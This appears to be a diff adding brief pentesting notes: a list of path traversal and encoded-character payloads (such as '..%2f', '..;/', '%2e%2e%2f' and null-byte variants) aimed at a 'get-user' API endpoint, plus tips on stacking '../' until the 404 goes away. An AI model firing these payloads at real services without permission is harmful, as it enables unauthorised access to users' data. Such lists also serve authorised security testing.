@@ -1,0 +1,16 @@
+get-user/..%2f
+get-user/..;/
+get-user/../
+get-user/..%00/
+get-user/..%0d/
+get-user/..%5c
+get-user/..\
+get-user/..%ff/
+get-user/%2e%2e%2f
+get-user/..%2e/
+get-user/%3f (?)
+get-user/%26 (&)
+get-user/%23 (#)
+
+../../../../ .. we keep doing this until we do not get 404
+sometimes if you guess part of the url then the response would be different
